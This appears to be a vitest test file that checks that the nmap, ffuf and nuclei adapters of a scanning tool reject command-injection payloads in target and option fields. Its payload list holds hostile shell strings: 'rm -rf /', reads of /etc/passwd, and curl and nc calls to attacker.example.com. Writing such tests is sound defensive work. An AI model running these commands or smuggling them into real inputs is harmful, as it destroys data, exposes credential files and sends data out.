import { describe, expect, it } from "vitest";
import { FfufAdapter } from "../../../src/modules/adapters/ffuf/ffuf.adapter";
import { NmapAdapter } from "../../../src/modules/adapters/nmap/nmap.adapter";
import { NucleiAdapter } from "../../../src/modules/adapters/nuclei/nuclei.adapter";
import { InvalidInputError, type RunContext } from "../../../src/modules/adapters/adapter.contract";

/**
 * Phase 14 adversarial verification (EXE-002, OWA-006 command injection): every adapter builds
 * `Invocation.args` as an explicit array handed to `child_process`/Docker -- never a shell
 * string -- so metacharacter escaping is a non-issue for how the array is *executed*. The actual
 * attack surface is upstream of that: a caller-supplied target or tool option reaching `args`
 * verbatim. This suite proves each adapter's Zod allow-list schema rejects shell-metacharacter
 * payloads in every free-text field before `buildInvocation` ever constructs `args`, for a battery
 * of classic injection payloads (`;`, `|`, `&&`, backticks, `$()`, newlines).
 */
const ctx: RunContext = {
  projectId: "11111111-1111-1111-1111-111111111111",
  runId: "22222222-2222-2222-2222-222222222222",
  target: "198.51.100.10",
  triggeredBy: "33333333-3333-3333-3333-333333333333",
};

const INJECTION_PAYLOADS = [
  "; rm -rf /",
  "$(cat /etc/passwd)",
  "`cat /etc/passwd`",
  "8080 && curl attacker.example.com",
  "8080 | nc attacker.example.com 4444",
  "8080\nrm -rf /",
];

describe("Command injection adversarial verification", () => {
  describe("NmapAdapter", () => {
    const adapter = new NmapAdapter();

    it.each(INJECTION_PAYLOADS)("rejects a shell-metacharacter payload in the target: %s", async (payload) => {
      await expect(adapter.buildInvocation({}, { ...ctx, target: payload })).rejects.toThrow(InvalidInputError);
    });

    it.each(INJECTION_PAYLOADS)("rejects a shell-metacharacter payload in the ports option: %s", async (payload) => {
      await expect(adapter.buildInvocation({ ports: payload }, ctx)).rejects.toThrow(InvalidInputError);
    });
  });

  describe("FfufAdapter", () => {
    const adapter = new FfufAdapter();
    const ffufCtx: RunContext = { ...ctx, target: "https://target.example.com" };

    it.each(INJECTION_PAYLOADS)("rejects a shell-metacharacter payload in the target: %s", async (payload) => {
      await expect(adapter.buildInvocation({}, { ...ffufCtx, target: payload })).rejects.toThrow(InvalidInputError);
    });

    it.each(INJECTION_PAYLOADS)(
      "rejects a shell-metacharacter payload in matchStatusCodes: %s",
      async (payload) => {
        await expect(adapter.buildInvocation({ matchStatusCodes: payload }, ffufCtx)).rejects.toThrow(
          InvalidInputError,
        );
      },
    );

    it("rejects an arbitrary wordlist path attempting to smuggle a payload -- only the allow-listed enum is accepted", async () => {
      await expect(
        adapter.buildInvocation({ wordlist: "/tmp/$(cat /etc/passwd)" }, ffufCtx),
      ).rejects.toThrow(InvalidInputError);
    });
  });

  describe("NucleiAdapter", () => {
    const adapter = new NucleiAdapter();

    it.each(INJECTION_PAYLOADS)("rejects a shell-metacharacter payload in the target: %s", async (payload) => {
      await expect(adapter.buildInvocation({}, { ...ctx, target: payload })).rejects.toThrow(InvalidInputError);
    });

    it("rejects an arbitrary template tag attempting to smuggle a payload -- only the allow-listed enum is accepted", async () => {
      await expect(adapter.buildInvocation({ tags: ["; rm -rf /"] }, ctx)).rejects.toThrow(InvalidInputError);
    });
  });
});
